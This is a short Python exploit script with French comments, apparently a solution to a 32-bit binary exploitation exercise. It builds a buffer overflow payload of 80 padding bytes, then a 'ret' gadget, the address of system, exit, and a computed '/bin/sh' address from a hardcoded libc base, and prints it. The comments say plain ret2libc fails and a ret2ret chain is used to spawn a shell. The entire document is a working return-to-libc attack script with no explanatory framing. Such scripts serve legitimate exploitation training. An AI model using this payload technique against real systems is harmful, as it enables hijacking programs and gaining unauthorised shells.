

# ret2libc fonctionne pas car commence par adresse system commence avec 0xb
# ret2ret

import struct 



padding = b'A'*80

ret_addres = struct.pack('<I', 0x08048544)
system_ret=struct.pack('<I', 0xb7ecffb0)
exit_addr= struct.pack('<I',0xb7ec60c0)

libc_base_add = 0xb7e97000
binsh_offset=  0x11f3bf

binsh_addr= struct.pack('<I',0xb7e97000+0x11f3bf)

payload = padding + ret_addres + system_ret  + exit_addr  + binsh_addr

print(payload)